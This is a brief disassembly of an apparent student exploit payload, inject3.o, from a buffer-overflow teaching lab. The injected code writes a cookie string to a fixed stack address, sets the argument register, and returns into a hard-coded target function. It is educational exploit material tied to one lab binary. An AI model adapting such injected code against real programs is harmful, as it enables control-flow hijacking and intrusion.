
inject3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <inject3>:
   0:	48 c7 c7 78 4e 64 55 	mov    $0x55644e78,%rdi
   7:	48 b8 34 62 30 32 61 	movabs $0x6630636132306234,%rax
   e:	63 30 66 
  11:	48 89 04 25 78 4e 64 	mov    %rax,0x55644e78
  18:	55 
  19:	68 80 19 40 00       	pushq  $0x401980
  1e:	c3                   	retq   
